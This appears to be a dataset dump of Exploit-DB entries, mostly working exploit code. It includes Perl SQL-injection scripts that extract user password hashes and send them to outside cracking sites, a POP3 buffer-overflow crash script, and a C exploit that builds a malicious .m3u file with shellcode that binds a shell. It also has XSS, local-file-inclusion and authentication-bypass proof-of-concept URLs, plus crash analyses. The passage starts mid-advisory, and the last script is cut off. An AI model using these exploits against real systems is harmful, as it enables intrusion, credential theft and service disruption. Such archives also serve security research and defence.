url=assets-library://group/?id=68D6D844-02EB-45C9-AA9E-28255915C551"" class=""thumbnail""><img src=""Photo%20Transfer_files/placeholder.png""  class=""album_image""></a><h5 class=""album_title""> <a href=""http://localhost/album.html?name=%3E%22%3Cscript%3Ealert%28document.cookie%29%3C/script%3E%3Cdiv%20style=%222& url=assets-library://group/?id=68D6D844-02EB-45C9-AA9E-28255915C551"" class=""thumbnail"">>""</a><div style=""2</h5> <p class="" album_desc""=""""><a href=""http://localhost/album.html?name=%3E%22%3Cscript%3Ealert%28document.cookie%29%3C/script%3E%3Cdiv%20 style=%222&url=assets-library://group/?id=68D6D844-02EB-45C9-AA9E-28255915C551"" class=""thumbnail"">0 Photos<p></p></a></div></h5></li> <li class=""album_warp""><a href=""http://localhost/album.html?name=%3E%22%3Cscript%3Ealert%28document.cookie%29%3C/script%3E%3Cdiv%20style=%221& url=assets-library://group/?id=C5231091-88C7-40E9-8C73-47FBEA7EBB65"" class=""thumbnail""><img src=""Photo%20Transfer_files/placeholder.png""  class=""album_image""></a><h5 class=""album_title""><a href=""http://localhost/album.html?name=%3E%22%3Cscript%3Ealert%28document.cookie%29%3C/ script%3E%3Cdiv%20style=%221&url=assets-library://group/?id=C5231091-88C7-40E9-8C73-47FBEA7EBB65"" class=""thumbnail"">>""</a> <div style=""1</h5><p class="" album_desc""=""""><a href=""http://localhost/album.html?name=%3E%22%3Cscript%3Ealert%28document.cookie%29%3C/ script%3E%3Cdiv%20style=%221&url=assets-library://group/?id=C5231091-88C7-40E9-8C73-47FBEA7EBB65"" class=""thumbnail"">0 Photos<p> </p></a></div></h5></li></ul>   Solution: ========= The vulnerability can be patched by a secure encoding or escape  when processing to add via POST method request folders with manipulated names.   Risk: ===== The security risk of the persistent input validation web vulnerability is estimated as medium(+).   Credits: ======== Vulnerability Laboratory [Research Team] - Benjamin Kunz Mejri (bkm@evolution-sec.com)   Disclaimer: =========== The information provided in this advisory is provided as it is without any warranty. Vulnerability Lab disclaims all warranties,  either expressed or implied, including the warranties of merchantability and capability for a particular purpose. Vulnerability- Lab or its suppliers are not liable in any case of damage, including direct, indirect, incidental, consequential loss of business  profits or special damages, even if Vulnerability-Lab or its suppliers have been advised of the possibility of such damages. Some  states do not allow the exclusion or limitation of liability for consequential or incidental damages so the foregoing limitation  may not apply. We do not approve or encourage anybody to break any vendor licenses, policies, deface websites, hack into databases  or trade with fraud/stolen material.  Domains:    www.vulnerability-lab.com   	- www.vuln-lab.com			       - www.evolution-sec.com Contact:    admin@vulnerability-lab.com 	- research@vulnerability-lab.com 	       - admin@evolution-sec.com Section:    www.vulnerability-lab.com/dev 	- forum.vulnerability-db.com 		       - magazine.vulnerability-db.com Social:	    twitter.com/#!/vuln_lab 		- facebook.com/VulnerabilityLab 	       - youtube.com/user/vulnerability0lab Feeds:	    vulnerability-lab.com/rss/rss.php	- vulnerability-lab.com/rss/rss_upcoming.php   - vulnerability-lab.com/rss/rss_news.php  Any modified copy or reproduction, including partially usages, of this file requires authorization from Vulnerability Laboratory.  Permission to electronically redistribute this alert in its unmodified form is granted. All other rights, including the use of other  media, are reserved by Vulnerability-Lab Research Team or its suppliers. All pictures, texts, advisories, source code, videos and  other information on this website is trademark of vulnerability-lab team & the specific authors or managers. To record, list (feed),  modify, use or edit our material contact (admin@vulnerability-lab.com or research@vulnerability-lab.com) to get a permission.  				Copyright © 2013 | Vulnerability Laboratory [Evolution Security]    --  VULNERABILITY LABORATORY RESEARCH TEAM DOMAIN: www.vulnerability-lab.com CONTACT: research@vulnerability-lab.com",Photo Transfer Upload,1
9042,"NEWSolved 1.1.6 - 'login grabber' Multiple SQL Injections #!/usr/bin/perl -w # Neversolved.pl # # Copyright (c) 2009 by <jmp-esp.net> # # A simple login grabber # by lama - 06/23/2009 # # Tested on: Newsolved 1.1.6  use strict; use LWP::UserAgent; use Getopt::Std; use vars qw/ %opt /; getopts( ""i:p:u:lfh"", \%opt );  my @bugs = (     [          ""newsscript.php?m=archive&jahr=0'+UnIoN+SeLeCt+CoNcAt('1',':',user,':',pw)+FrOm+[PRE""         .""FIX]_intern_users+WhErE+id='[USERID]&jahr_check=ok"",          ""monat_num=1:(.*?):([a-f0-9]{32})""     ],     [          ""newsscript.php?m=archive&topic_check=ok&idneu=-1'+UnIoN+SeLeCt+3,CoNcAt(user,':',pw""         .""),1,4,1,5,9,2,6,5,3,5,8,9,7,9,3,2,3,8+FrOm+[PREFIX]_intern_users+WhErE+id='[USERID]"",          ""([^>]+):([a-f0-9]{32})<""      ],     [          ""newsscript.php?mailto=ok&newsid=-1'+UnIoN+SeLeCt+1,CoNcAt(user,':',pw),6,1,8,0,3,3,""         .""9,8,8,7,4,9,8,9,4,8,4,8+FrOm+[PREFIX]_intern_users+WhErE+id='[USERID]"",          ""<i>(.*?):([a-f0-9]{32})<\/i>""      ] );  my @lookups = (     [         'http://md5.rednoize.com/?q=[HASH]&s=md5&go=Search',         '',         '<div id=""result"" >(.*?)</div>'     ],     [         'http://milw0rm.com/cracker/search.php',         'hash=[HASH]&Submit=Submit',         '>[a-f0-9]{32}</TD><TD align=""middle"" nowrap=""nowrap"" width=90>(.*?)</TD>'     ],     [         'http://securitystats.com/tools/hashcrack.php',         'inputhash=[HASH]&type=MD5&Submit=Submit',         '<BR>[a-f0-9]{32} = (.*?)</td>'     ],     [         'http://md5decrypter.com/index.php',         'hash=[HASH]&submit=Decrypt',         '<b class=\'red\'>Normal Text: </b>(.*?)\n'     ] );  sub isHost {     my $target = shift;     if ( $target =~ /(?:http:\/\/)?([\w\.\-\_]*)(\/.*)?/ )     {         my $host = $1;         my $folder = ( $2 ? $2 : '/' );         if ( $folder !~ /\/$/ )          {              $folder .= '/';         }         return ""http://$host$folder"";      }     else     {          return 0;     } }  sub replacePlaceholder {     my $search = shift;     my $replace = shift;     my $placeholder = shift;     $search=~s/\[$placeholder\]/$replace/g;      return $search; }  sub isVulnerable {     my $target = shift;     my $ua = LWP::UserAgent->new;     my $request = new HTTP::Request('GET', $target);      $request->header('User-Agent' => $opt{u});     my $response = $ua->request($request);     my $body = $response->content;     if ($body =~ /mysql_fetch_object/)     {         return 1;     }     elsif (!($body =~ /styles_output\.css/))     {         return 0;         }     else     {         return -1;     } }  sub getHash {     my $target = shift;     my $regexp = shift;     my $ua = LWP::UserAgent->new;     my $request = new HTTP::Request('GET', $target);      $request->header('User-Agent' => $opt{u});     my $response = $ua->request($request);     my $body = $response->content;     if ($body =~ /$regexp/)     {         return ($1, $2);     }     else     {         return 0;         } }  sub searchPlaintext {     my $hash = shift;     foreach (@lookups)     {         my $server = replacePlaceholder(@$_[0], $hash, ""HASH"");         my $post = replacePlaceholder(@$_[1], $hash, ""HASH"");         my $ua = LWP::UserAgent->new;         my $request = new HTTP::Request('POST', $server);          $request->content(""$post"");          $request->content_type('application/x-www-form-urlencoded');         $request->header('Referer' => $server);         $request->header('User-Agent' => $opt{u});         my $response = $ua->request($request);         my $body = $response->content;         if ($body =~ /@$_[2]/)         {             return $1;         }      }     return 0; }  sub attackTarget {     my $target = shift;     my $userid = shift;     foreach (@bugs)     {         my $bug = @$_[0];         $bug = replacePlaceholder($bug, $userid, ""USERID"");         $bug = replacePlaceholder($bug, $opt{p}, ""PREFIX"");         (my $username, my $password) = getHash($target.$bug, @$_[1]);         if (($username) && ($password))         {             return ($username, $password);         }     }     return 0; }  sub showHelp {     print ""Newsolved <= 1.1.6 Sploiter ( jmp-esp.net )\n""         . ""Usage: $0 [options] Victim\n""         . ""OPTIONS\n""         . "" -i integer: Userid [1]\n""         . "" -u string: Useragent [IE]\n""         . "" -p string: Prefix [newsolved]\n""         . "" -f: Force [optional]\n""         . "" -l: Lookup [optional]\n""         . "" -h: Help [optional]\n""         . ""EXAMPLES\n""         . "" ./$0 http://pentagon.gov/news/\n""         . "" ./$0 -f -i 4 http://omnomnom.com/\n""         . ""OTHER\n""         . "" Magic_Quotes_GPC needs to be off\n""; }  sub showBanner {     print ""  __                                          \n""         . "" |__|.--------.-----.______.-----.-----.-----.\n""         . "" |  ||        |  _  |______|  -__|__ --|  _  |\n""         . "" |  ||__|__|__|   __|      |_____|_____|   __|\n""         . ""|___|         |__|    lama  06/23/2009 |__|   \n""         . ""Kampfgeschrei!\n\n"";     }  if ($opt{h}) {     showHelp();     exit; }  my $victim = shift; if (!($victim) || !($victim = isHost($victim))) {     showHelp();     exit;     }  $opt{u} = 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)' if (!$opt{u}); $opt{i} = '1' if (!$opt{i}); $opt{p} = 'newsolved' if (!$opt{p});  if (scalar(@bugs) < 1) {     print ""Bugs or gtfo. Srsly.\n"";     exit; }  my $vulnerability = isVulnerable($victim.$bugs[0][0]); if ($vulnerability == 0) {     print ""This doesn't look like Newsolved. Read the help, now.\n\n"";     showHelp();     exit if (!$opt{f}); } elsif ($vulnerability == -1) {     print ""Magic_Quotes_Gpc seems to be on. Read the help, now.\n\n"";     showHelp();     exit if (!$opt{f}); }  showBanner(); (my $username, my $password) = attackTarget($victim, $opt{i}); if ($username) {     print ""Target:\t\t"".isHost($victim)."" ( ID: "".$opt{i}."" )\n"";     print ""Username:\t$username\nPassword:\t$password\n"";     if ($opt{l})     {         my $cleartext = searchPlaintext($password);         if ($cleartext)         {             print ""Cleartext:\t$cleartext\n"";         }         else         {             print ""Cleartext:\tNot found\n"";         }     } } else {     print ""Unable to retrieve the password: Is the userid correct?\n""; }  # milw0rm.com [2009-06-29]",NEWSolved,1
644,"DMS POP3 Server 1.5.3 build 37 - Remote Buffer Overflow #===== Start DMS_POP3_Overflow.pl ===== # # Usage: DMS_POP3_Overflow.pl <ip> <port> #        DMS_POP3_Overflow.pl 127.0.0.1 110 # # DMS POP3 Server for Windows 2000/XP 1.5.3 build 37 # # Download: # http://www.digitalmapping.sk.ca/pop3srv/default.asp # # Patch: # http://www.digitalmapping.sk.ca/pop3srv/Update.asp # #####################################################  use IO::Socket; use strict;  my($socket) = """";  if ($socket = IO::Socket::INET->new(PeerAddr => $ARGV[0], 				    PeerPort => $ARGV[1], 				    Proto    => ""TCP"")) { 	print ""Attempting to kill DMS POP3 service at $ARGV[0]:$ARGV[1]..."";  	sleep(1);  	print $socket ""USER "" . ""A"" x 1023;  	close $socket;  	sleep(1);  	if ($socket = IO::Socket::INET->new(PeerAddr => $ARGV[0], 					    PeerPort => $ARGV[1], 					    Proto    => ""TCP"")) 	{ 		close $socket;  		print ""failed!\n""; 	} 	else 	{ 		print ""successful!\n""; 	} } else { 	print ""Cannot connect to $ARGV[0]:$ARGV[1]\n""; }  # milw0rm.com [2004-11-21]",DMS POP3 Server for Windows,1
41563,"TradeMart 1.1 - SQL Injection # # # # #  # Exploit Title: TradeMart - B2B Trading Software v1.1 - SQL Injection # Google Dork: N/A # Date: 09.03.2017 # Vendor Homepage: https://www.ncrypted.net/ # Software: https://www.ncrypted.net/trademart # Demo: http://demo.ncryptedprojects.com/trademart/ # Version: 1.1 # Tested on: Win7 x64, Kali Linux x64 # # # # #  # Exploit Author: Ihsan Sencan # Author Web: http://ihsan.net # Author Mail : ihsan[@]ihsan[.]net # # # # # # SQL Injection/Exploit : # http://localhost/[PATH]/Search?by=p&q=&user=[SQL] # Etc.. # # # # #",TradeMart,1
4681,"ftp Admin 0.1.0 - Local File Inclusion / Cross-Site Scripting / Authentication Bypass FTP Admin v0.1.0 - MULTIPLE VULNERABILITIES 	by Omni  1) Infos --------- Date            : 2007-11-28 Product         : FTP Admin Version         : v0.1.0 Vendor          : http://sourceforge.net/projects/ftpadmin/ Vendor Status   : 2007-11-30 Informed!  Description     : FTP admin is a web-based user administration tool, for usage in combination with vsftpd. FTP admin                   requires sudo. Features include modification of users and generation of user passwords.  Source          : omnipresent - omni E-mail          : omnipresent[at]NOSPAMemail[dot]it - omni[at]NOSPAMplayhack[dot]net Team            : Playhack.net Security  2) Security Issues -------------------  --- [ XSS ] --- ===============================================  I think that is better let you see a PoC instead of explain where is the bug.. If you want to know it just look at the  source code.  --- [ PoC ] --- ===============  http://localhost/ft/index.php?page=error&error=<b>...</b> http://localhost/ft/index.php?page=error&error=<script>alert(1)</script>   --- [ Local File Inclusion ] --- ================================  Take a look in index.php, line 49: include(""$page.php"");  Remembe that you have to log in to made local file inclusion (loggedin = true -> register_global = On)  [ Remembe that ] if(!is_file($page . "".php"") || (!is_readable($page . "".php""))) { 		$page = ""error""; 		$error = ""Page does not exist or is not readable\n""; 	} } [ /Remembe that ]  --- [ PoC ] --- ===============  http://localhost/ft/index.php?page=pass.txt%00&loggedin=true  To see pass.txt ...  --- [ Admin Bypass ] --- ================================  Today I'm too lazy to explain what's wrong.. so take a look in the source code and watch the var $loggedin !!  --- [ PoC ] --- ===============  To add a user...  http://localhost/ft/index.php?page=add&loggedin=true  # milw0rm.com [2007-11-29]",vsftpd FTP,0
43715,Microsoft Edge Chakra - Incorrect Scope Handling // PoC:  (function func(arg = function () {     print(func);  // SetHasOwnLocalInClosure should be called for the param scope in the PostVisitFunction function. }()) {     print(func);     function func() {      } })();  // Chakra fails to distinguish whether the function is referenced in the param scope and ends up to emit an invalid opcode.,Microsoft Edge Chakra,1
5077,"Total Video Player 1.20 - '.m3u' File Local Stack Buffer Overflow /*0day Total Video Player V1.20 .M3u File Local Stack Buffer Overflow This exploit spawns Calc.exe or binds a port and spawns a shell and tested on Windows Xp sp 2. I got the ideea to look in a prior version of TVP and surprinse vuln to ,just as V1.30. When parsing a crafted .m3u file stack gets corrupted,due a  long string,and causes a stack overflow.We get control of the EBP and EIP registers.The ESP register points exactly after the retaddress position. [corrupted stack] [EIP->points here][ESP->points here] So do a jmp back and a JMP ESP and it points to a specific part of the stack that I want.Credits to finding this bug && sploit go to fl0 fl0w. Vendor not informed yet. Special THANKS to Expanders !!!! */  #include<stdio.h> #include <stdlib.h> #include <string.h> #include<windows.h>  #define FIRST ""#EXTM3U\r\n#EXTINF:3:50,-Ombladon - Noapte Buna Bucuresti Feat. Guesswho\r\nD:\\"" #define LAST "".mp3\r\n"" #define OFFSET 545  #define EVILFILE ""evil.m3u""  //shellcode from metasploit char scz1[]= ""\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x49\x49\x49\x49\x49\x49"" ""\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x51\x5a\x37\x6a\x63"" ""\x58\x30\x42\x30\x50\x42\x6b\x42\x41\x73\x41\x42\x32\x42\x41\x32"" ""\x41\x41\x30\x41\x41\x58\x38\x42\x42\x50\x75\x38\x69\x69\x6c\x38"" ""\x68\x41\x54\x77\x70\x57\x70\x75\x50\x6e\x6b\x41\x55\x55\x6c\x6e"" ""\x6b\x43\x4c\x66\x65\x41\x68\x45\x51\x58\x6f\x4c\x4b\x50\x4f\x62"" ""\x38\x6e\x6b\x41\x4f\x31\x30\x36\x61\x4a\x4b\x41\x59\x6c\x4b\x74"" ""\x74\x6e\x6b\x44\x41\x4a\x4e\x47\x41\x4b\x70\x6f\x69\x6c\x6c\x4c"" ""\x44\x4b\x70\x43\x44\x76\x67\x4b\x71\x4a\x6a\x66\x6d\x66\x61\x39"" ""\x52\x5a\x4b\x4a\x54\x75\x6b\x62\x74\x56\x44\x73\x34\x41\x65\x4b"" ""\x55\x4e\x6b\x73\x6f\x54\x64\x53\x31\x6a\x4b\x35\x36\x6c\x4b\x64"" ""\x4c\x30\x4b\x6c\x4b\x73\x6f\x57\x6c\x75\x51\x6a\x4b\x6c\x4b\x37"" ""\x6c\x6c\x4b\x77\x71\x68\x6b\x4c\x49\x71\x4c\x51\x34\x43\x34\x6b"" ""\x73\x46\x51\x79\x50\x71\x74\x4c\x4b\x67\x30\x36\x50\x4c\x45\x4b"" ""\x70\x62\x58\x74\x4c\x6c\x4b\x53\x70\x56\x6c\x4e\x6b\x34\x30\x47"" ""\x6c\x4e\x4d\x6c\x4b\x70\x68\x37\x78\x58\x6b\x53\x39\x6c\x4b\x4f"" ""\x70\x6c\x70\x53\x30\x43\x30\x73\x30\x6c\x4b\x42\x48\x77\x4c\x61"" ""\x4f\x44\x71\x6b\x46\x73\x50\x72\x76\x6b\x39\x5a\x58\x6f\x73\x4f"" ""\x30\x73\x4b\x56\x30\x31\x78\x61\x6e\x6a\x78\x4b\x52\x74\x33\x55"" ""\x38\x4a\x38\x69\x6e\x6c\x4a\x54\x4e\x52\x77\x79\x6f\x79\x77\x42"" ""\x43\x50\x61\x70\x6c\x41\x73\x64\x6e\x51\x75\x52\x58\x31\x75\x57"" ""\x70\x63""; char scz2[]=""\x31\xc9\x83\xe9\xb0\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x50"" ""\x8a\xfa\x90\x83\xeb\xfc\xe2\xf4\xac\xe0\x11\xdd\xb8\x73\x05\x6f"" ""\xaf\xea\x71\xfc\x74\xae\x71\xd5\x6c\x01\x86\x95\x28\x8b\x15\x1b"" ""\x1f\x92\x71\xcf\x70\x8b\x11\xd9\xdb\xbe\x71\x91\xbe\xbb\x3a\x09"" ""\xfc\x0e\x3a\xe4\x57\x4b\x30\x9d\x51\x48\x11\x64\x6b\xde\xde\xb8"" ""\x25\x6f\x71\xcf\x74\x8b\x11\xf6\xdb\x86\xb1\x1b\x0f\x96\xfb\x7b"" ""\x53\xa6\x71\x19\x3c\xae\xe6\xf1\x93\xbb\x21\xf4\xdb\xc9\xca\x1b"" ""\x10\x86\x71\xe0\x4c\x27\x71\xd0\x58\xd4\x92\x1e\x1e\x84\x16\xc0"" ""\xaf\x5c\x9c\xc3\x36\xe2\xc9\xa2\x38\xfd\x89\xa2\x0f\xde\x05\x40"" ""\x38\x41\x17\x6c\x6b\xda\x05\x46\x0f\x03\x1f\xf6\xd1\x67\xf2\x92"" ""\x05\xe0\xf8\x6f\x80\xe2\x23\x99\xa5\x27\xad\x6f\x86\xd9\xa9\xc3"" ""\x03\xd9\xb9\xc3\x13\xd9\x05\x40\x36\xe2\xeb\xcc\x36\xd9\x73\x71"" ""\xc5\xe2\x5e\x8a\x20\x4d\xad\x6f\x86\xe0\xea\xc1\x05\x75\x2a\xf8"" ""\xf4\x27\xd4\x79\x07\x75\x2c\xc3\x05\x75\x2a\xf8\xb5\xc3\x7c\xd9"" ""\x07\x75\x2c\xc0\x04\xde\xaf\x6f\x80\x19\x92\x77\x29\x4c\x83\xc7"" ""\xaf\x5c\xaf\x6f\x80\xec\x90\xf4\x36\xe2\x99\xfd\xd9\x6f\x90\xc0"" ""\x09\xa3\x36\x19\xb7\xe0\xbe\x19\xb2\xbb\x3a\x63\xfa\x74\xb8\xbd"" ""\xae\xc8\xd6\x03\xdd\xf0\xc2\x3b\xfb\x21\x92\xe2\xae\x39\xec\x6f"" ""\x25\xce\x05\x46\x0b\xdd\xa8\xc1\x01\xdb\x90\x91\x01\xdb\xaf\xc1"" ""\xaf\x5a\x92\x3d\x89\x8f\x34\xc3\xaf\x5c\x90\x6f\xaf\xbd\x05\x40"" ""\xdb\xdd\x06\x13\x94\xee\x05\x46\x02\x75\x2a\xf8\x2e\x52\x18\xe3"" ""\x03\x75\x2c\x6f\x80\x8a\xfa\x90"";  char jmpback[] = ""\xE9\xDE\xFD\xFF\xFF"";  void Notes();      int main()  {      FILE *p;   unsigned char *buffer;   unsigned int offset=0;   unsigned int retaddress=0x015EE557;   int input=0;   Notes();    if((p=fopen(EVILFILE,""wb""))==NULL) { printf(""error\n""); exit(0);    }    scanf(""%d"",&input);    switch(input)   {  case 1:              buffer=(unsigned char *)malloc(OFFSET+5+strlen(scz1)+12);                       memset(buffer+offset,0x90,OFFSET+5+strlen(scz1)+12);              offset=OFFSET;                    memcpy(buffer+offset,&retaddress,4);                  offset=OFFSET+4;              offset+=12;              memcpy(buffer+offset,scz1,strlen(scz1));              offset+=strlen(scz1);               memset(buffer+offset,0x00,1);              fprintf(p,""%s%s%s"",FIRST,buffer,LAST);              fclose(p);                                                                            break;     case 2:                            buffer=(unsigned char *)malloc(OFFSET+5+strlen(scz2)+12);                       memset(buffer+offset,0x90,OFFSET+5+strlen(scz2)+12);              offset=OFFSET;                    memcpy(buffer+offset,&retaddress,4);                  offset=OFFSET+4;              offset+=12;              memcpy(buffer+offset,scz2,strlen(scz2));              offset+=strlen(scz2);               memset(buffer+offset,0x00,1);              fprintf(p,""%s%s%s"",FIRST,buffer,LAST);              fclose(p);                                                                            break;   }     free(buffer);  return 0;   }    void Notes() {   printf(""^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\n"");     printf(""Total Video Player V1.20 .M3u File Local Stack Buffer Overflow\n"");     printf(""Credits for finding this bug&&sploit go to fl0 fl0w\n"");     printf(""SPECIAL THANKS TO EXPANDERS\n\n"");     printf(""{1}Spawn Calc.exe\n"");     printf(""{2}Bind port&&spanw a shell\n\n"");      printf(""^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n""); }    // milw0rm.com [2008-02-07]",Total Video Player,1
41418,"Microsoft Office PowerPoint 2010 - MSO/OART Heap Out-of-Bounds Access Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=950  Platform: Microsoft Office 2010 on Windows 7 x86 Class: Time of check time of use leading to memory corruption  The following crash was observed in Microsoft Office 2010 running under Windows 7 x86 with Application Verifier enabled. This crash is non-deterministic and will not reproduce in all instances but the crash demonstrated a high degree of reliability.   Attached files: 910494862.ppt: fuzzed crashing file  File versions: mso.dll: 14.0.7173.5000 oart.dll: 14.0.7169.5000 ppcore.dll: 14.0.7173.5000  (510.66c): Access violation - code c0000005 (first chance) First chance exceptions are reported before any exception handling. This exception may be expected and handled. eax=1a6f0fb0 ebx=3c782fc4 ecx=1a53cfe0 edx=000004bf esi=1a53cfe0 edi=1a4d6fc0 eip=66acdf93 esp=0013d8b0 ebp=0013d8bc iopl=0         nv up ei pl nz na po nc cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00210202 mso!Ordinal4899+0xd33: 66acdf93 f6465804        test    byte ptr [esi+58h],4       ds:0023:1a53d038=??  0:000> uf 0x66acdf8b mso!Ordinal4899+0xd2b: 66acdf8b 55              push    ebp 66acdf8c 8bec            mov     ebp,esp 66acdf8e 51              push    ecx 66acdf8f 51              push    ecx 66acdf90 56              push    esi 66acdf91 8bf1            mov     esi,ecx => 66acdf93 f6465804        test    byte ptr [esi+58h],4  Call Stack:  0:000> kb ChildEBP RetAddr  Args to Child               WARNING: Stack unwind information not available. Following frames may be wrong. 0013d8bc 66ba7720 00000000 1a9d6f98 66ad3d33 mso!Ordinal4899+0xd33 0013d948 67908f0d 1a996e30 1a9d6f98 0000001a mso!Ordinal4720+0x201 0013d980 67906400 0013d9fc 679063f4 0013d9fc oart!Ordinal7979+0x35 0013d994 67908f30 2cccaf58 0013d9fc 0013d9cc oart!Ordinal2490+0x10b 0013d9a4 677e2a14 0013d9fc 1a4d6fd8 1a984ff0 oart!Ordinal7979+0x58 0013d9cc 677e2999 1a4d6ff0 0013d9fc 0013da0c oart!Ordinal6+0xc4 0013d9dc 6788730f 0013d9fc 3a5fe1a5 1a554f8c oart!Ordinal6+0x49 0013da0c 68c8e465 3c782fc4 3a5ff871 68b7e504 oart!Ordinal1989+0xaa 0013da44 68c985dd 3a5fc635 0013e4b4 68b8661c ppcore!PPMain+0x9130c 0013e400 68d0540f 00000000 3c886ea0 00000001 ppcore!PPMain+0x9b484  In this crash the pointer being dereferenced in esi is being tested for a flag value. However, the pointer is referencing invalid memory generating an access violation. The esi value came from the ecx register which is presumably the this pointer. Previous chunk at esi-0x58 is valid memory but 0x58 is beyond that allocated size of that chunk:  0:000> !heap -p -a 19841038     address 19841038 found in     _DPH_HEAP_ROOT @ 11a1000     in busy allocation (  DPH_HEAP_BLOCK:         UserAddr         UserSize -         VirtAddr         VirtSize)                                 197f1d9c:         19840fe0               20 -         19840000             2000     70588e89 verifier!AVrfDebugPageHeapAllocate+0x00000229     778c616e ntdll!RtlDebugAllocateHeap+0x00000030     7788a08b ntdll!RtlpAllocateHeap+0x000000c4     77855920 ntdll!RtlAllocateHeap+0x0000023a     710ead1a vrfcore!VerifierSetAPIClassName+0x000000aa     6d7b16ac vfbasics+0x000116ac     60b20233 mso!Ordinal9052+0x0000713f     67808744 oart!Ordinal2033+0x00000090     678086ab oart!Ordinal6561+0x000000ac     6781af9f oart!Ordinal5870+0x00000060  Looking at the calling function:  0:000> uf 0x66ba76ef mso!Ordinal4720+0x1d0: 66ba76ef 56              push    esi 66ba76f0 8bf1            mov     esi,ecx 66ba76f2 e8a7ddfaff      call    mso!Ordinal8038+0x461 (66b5549e) ; first call 66ba76f7 85c0            test    eax,eax 66ba76f9 7427            je      mso!Ordinal4720+0x203 (66ba7722)  mso!Ordinal4720+0x1dc: 66ba76fb 8bce            mov     ecx,esi 66ba76fd e89cddfaff      call    mso!Ordinal8038+0x461 (66b5549e) ; second call 66ba7702 83781400        cmp     dword ptr [eax+14h],0 66ba7706 741a            je      mso!Ordinal4720+0x203 (66ba7722)  mso!Ordinal4720+0x1e9: 66ba7708 8bce            mov     ecx,esi 66ba770a e88fddfaff      call    mso!Ordinal8038+0x461 (66b5549e) ; third call 66ba770f 8b4014          mov     eax,dword ptr [eax+14h] 66ba7712 8b4810          mov     ecx,dword ptr [eax+10h] ; crashing ecx value 66ba7715 85c9            test    ecx,ecx 66ba7717 7413            je      mso!Ordinal4720+0x20d (66ba772c)  mso!Ordinal4720+0x1fa: 66ba7719 6a00            push    0 66ba771b e86b68f2ff      call    mso!Ordinal4899+0xd2b (66acdf8b) ; crashing function 66ba7720 5e              pop     esi 66ba7721 c3              ret  mso!Ordinal4720+0x203: 66ba7722 f6465804        test    byte ptr [esi+58h],4 ; same check as crashing function 66ba7726 7404            je      mso!Ordinal4720+0x20d (66ba772c)  mso!Ordinal4720+0x209: 66ba7728 8bce            mov     ecx,esi 66ba772a ebed            jmp     mso!Ordinal4720+0x1fa (66ba7719)  mso!Ordinal4720+0x20d: 66ba772c b8ff0f0000      mov     eax,0FFFh 66ba7731 5e              pop     esi 66ba7732 c3              ret  Looking at the logic flow from this function we see at the very first call to mso!Ordinal8038+0x461 must return a non-null value or else the same check in the crashing function is performed in the calling function. With a non-null return this same function is called again only this time the value at [eax+0x14h] is checked to be non-null. If this second check passed then the we call the same function a third time! This time we follow the pointer at [[eax+0x14]+0x10] and check it to be non-null before passing it to the crashing function. Given the repeating calls to the same function and the non-determinism of the bug I suspect this is a time of check time of use bug on the object implementing these methods.    Proof of Concept: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/41418.zip",Microsoft Office PowerPoint,1
6279,"Pars4U Videosharing 1.0 - Cross-Site Scripting / Blind SQL Injection #!/usr/bin/perl use LWP::UserAgent; use Getopt::Long; if(!$ARGV[1]) {   print ""                                                                  \n"";   print ""   ################## VIVA ISLAME VIVA ISLAME ####################\n"";   print ""   ################## VIVA ISLAME VIVA ISLAME ####################\n"";   print ""   ##                                                           ##\n"";   print ""   ##   Pars4u Videosharing V1 Blind SQL Injection Exploit      ##\n"";   print ""   ##                                                           ##\n"";   print ""   ##                      ( categories_portal.php cat_id )     ##\n"";   print ""   ##   http://pars4u.com/videosharing.html                     ##\n"";   print ""   ##                                                           ##\n"";   print ""   ##   Author: Mr.SQL              -(:: SYRIAN HACKERS ::)-    ##\n"";   print ""   ##   EMAIL : SQL(at)HOTMAIL.IT                               ##\n"";   print ""   ##   HOME  : WwW.PaL-HaCkEr.CoM                              ##\n"";   print ""   ##                                                           ##\n"";   print ""   ##              -((:: !GrE3E3E3E3E3ETZz! ::))-               ##\n"";   print ""   ##                                                           ##\n"";   print ""   ## - HaCkEr_EGy - His0k4 - Dark MaSTer - MoHaMaD AL 3rab -   ##\n"";   print ""   ##              - Milw0rM -  Ghost Hacker   -                ##\n"";   print ""   ##                                                           ##\n"";   print ""   ##               <<>>   MuSliMs HaCkErS   <<>>               ##\n"";   print ""   ##                                                           ##\n"";   print ""   ##   Usage  : perl exploit.pl host                           ##\n"";   print ""   ##   Example: perl exploit.pl www.host.com / -d 10           ##\n"";   print ""   ##                                                           ##\n"";   print ""   ##   Options:                                                ##\n"";   print ""   ##     -d    valid cat_id value                              ##\n"";   print ""   ###############################################################\n"";   print ""   ###############################################################\n"";   exit; } my $host    = $ARGV[0]; my $cat_id    = $ARGV[2]; my %options = (); GetOptions(\%options, ""u=i"", ""p=s"", ""d=i""); print ""[~] Exploiting...\n""; if($options{""u""}) {   $cat_id = $options{""u""}; } if($options{""d""}) {   $cat_id = $options{""d""}; } syswrite(STDOUT, ""[~] MD5-Hash: "", 14); for(my $i = 1; $i <= 32; $i++) {   my $f = 0;   my $h = 48;   while(!$f && $h <= 57)   {     if(istrue2($host, $path, $cat_id, $i, $h))     {       $f = 1;       syswrite(STDOUT, chr($h), 1);     }     $h++;   }   if(!$f)   {     $h = 97;     while(!$f && $h <= 122)     {       if(istrue2($host, $cat_id, $i, $h))       {         $f = 1;         syswrite(STDOUT, chr($h), 1);       }       $h++;     }   } } print ""\n[~] Exploiting done\n""; sub istrue2 {   my $host  = shift;   my $cat_id  = shift;   my $i     = shift;   my $h     = shift;     my $ua    = LWP::UserAgent->new;   my $query = ""http://"".$host.""categories_portal.php?cat_id="".$cat_id."" and (SUBSTRING((SELECT password FROM users LIMIT 0,1),"".$i."",1))=CHAR("".$h."")"";     if($cat_id{""p""})   {     $ua->proxy('http', ""http://"".$cat_id{""p""});   }     my $resp    = $ua->get($query);   my $content = $resp->content;   my $regexp  = ""1&cat_a"";     if($content =~ /$regexp/)   {     return 1;   }   else   {     return 0;   } }   ####################### ## 